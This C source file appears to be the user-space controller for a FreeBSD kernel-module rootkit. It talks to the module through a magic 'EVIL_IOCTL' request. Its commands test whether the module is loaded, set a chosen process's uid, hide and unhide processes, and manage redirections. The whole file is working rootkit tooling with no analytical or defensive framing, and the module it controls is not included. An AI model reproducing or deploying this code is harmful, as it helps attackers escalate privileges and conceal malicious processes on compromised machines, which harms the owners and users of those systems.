#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include "config.h"

int
send_request (int command, ...)
{
	char	buf[8];
	va_list	va;
	int	*ptr, s;
	o2_args	args;

	args.command = command;
	args.res = -1;
	va_start (va, command);
	ptr = args.args;
	while ((s = va_arg (va, int))) {
		*ptr++ = s;
	}
	memcpy (buf, EVIL_IOCTL_MAGIC, 4);
	*(unsigned long **)(buf + 4) = (unsigned long *)&args;
	ioctl (0, EVIL_IOCTL_COMMAND, buf);
	return (args.res);
}

int
ping (int argc, char **argv)
{
	if (send_request (PING_COMMAND, 0x0) == -1) {
		printf ("no kld loaded\n");
		return (EXIT_FAILURE);
	} else {
		printf ("kld loaded!\n");
	}
	return (EXIT_SUCCESS);
}

int
redir (int argc, char **argv)
{
	unsigned char	buf[1024];

	if (argc < 1) {
		fprintf (stderr, "usage: redir <list|add|rm>\n");
		return (-1);
	}

	if (!strcasecmp (argv[0], "add")) {
		if (argc < 3) {
			fprintf (stderr, "add: <from> <to>\n");
			return (-1);
		}
		return (send_request (REDIR_COMMAND, REDIR_ADD, argv[1], argv[2], 0x0));
	} else if (!strcasecmp (argv[0], "list")) {
		char	*ptr = buf;
		int	cnt = 0;

		if (send_request (REDIR_COMMAND, REDIR_LIST, buf, 0x0)) {
			printf ("oops\n");
			return (-1);
		}

		for (;*ptr;++cnt) {
			printf ("%d: %s -> ", cnt, ptr);
			ptr += strlen(ptr) + 1;
			printf ("%s\n", ptr);
			ptr += strlen(ptr) + 1;
		}		
	} else if (!strcasecmp (argv[0], "rm")) {
		int	cnt = 0;

		cnt = atoi (argv[1]) + 1;
		if (send_request (REDIR_COMMAND, REDIR_RM, cnt, 0x0)) {
			printf ("oops\n");
			return (-1);
		}
	}
}

int
pid (int argc, char **argv)
{
	int	pid;

	if (argc < 2) {
		fprintf (stderr, "usage: pid <pid> <uid|hide|unhide> <args>\n");
		return (EXIT_FAILURE);
	}

	pid = atoi (argv[0]);

	argc--;
	argv++;

	if (!strcasecmp (argv[0], "uid")) {
		int	uid;

		if (argc < 2) {
			printf ("usage: uid <uid>\n");
			return (EXIT_FAILURE);
		}
		uid = atoi (argv[1]);
		send_request (PID_COMMAND, pid, PID_UID, uid, 0x0);
	} else if (!strcasecmp (argv[0], "hide")) {
		send_request (PID_COMMAND, pid, PID_HIDE, 0x0);
	} else if (!strcasecmp (argv[0], "unhide")) {
		send_request (PID_COMMAND, pid, PID_UNHIDE, 0x0);
	} else {
		return (EXIT_FAILURE);
	}

	return (EXIT_SUCCESS);
}

int
main (int argc, char **argv)
{
	if (argc < 2) {
		fprintf (stderr, "usage: <commands> <args>\n"
			"\tping <args>\n"
			"\tpid <args>\n");
		return (EXIT_FAILURE);
	}

	if (!strcasecmp (argv[1], "ping")) {
		return (ping (argc - 2, argv + 2));
	} else if (!strcasecmp (argv[1], "pid")) {
		return (pid (argc - 2, argv + 2));
	} else if (!strcasecmp (argv[1], "redir")) {
		return (redir (argc - 2, argv + 2));
	}

	return (EXIT_FAILURE);
}
